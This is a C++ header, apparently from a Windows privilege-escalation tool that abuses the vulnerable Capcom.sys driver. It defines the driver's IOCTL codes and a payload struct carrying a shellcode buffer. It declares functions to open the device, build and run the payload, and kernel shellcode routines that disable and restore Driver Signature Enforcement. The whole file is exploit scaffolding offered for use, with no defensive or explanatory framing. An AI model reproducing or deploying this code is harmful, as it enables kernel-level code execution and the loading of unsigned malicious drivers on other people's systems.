#pragma once
#include <Windows.h>
#include <winternl.h>
#include "LockedMemory.h"

using fnMmGetSystemRoutineAddress   = PVOID(NTAPI*)(PUNICODE_STRING);
using fnCapcomRunFunc               = VOID(NTAPI*)(fnMmGetSystemRoutineAddress, PVOID);

namespace Capcom {
#define IOCTL_X86						0xAA012044
#define IOCTL_X64						0xAA013044

struct CapcomPayload {
	PVOID MinusOne;
	BYTE Shellcode[1016];
};

HANDLE openDevice();
CapcomPayload * buildPayload(fnCapcomRunFunc, PVOID);
int run(HANDLE Device, fnCapcomRunFunc, PVOID);
} //namespace

namespace Shellcode {
void NON_PAGED_CODE NTAPI helloWorld(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress,
											PVOID Data);
void NON_PAGED_CODE NTAPI initFuncPtrs(
		fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress, PVOID Data);
void NON_PAGED_CODE NTAPI disableDSE(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress,
												 PVOID Data);
void NON_PAGED_CODE NTAPI restoreDSE(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress,
												 PVOID Data);
} // namespace Shellcode
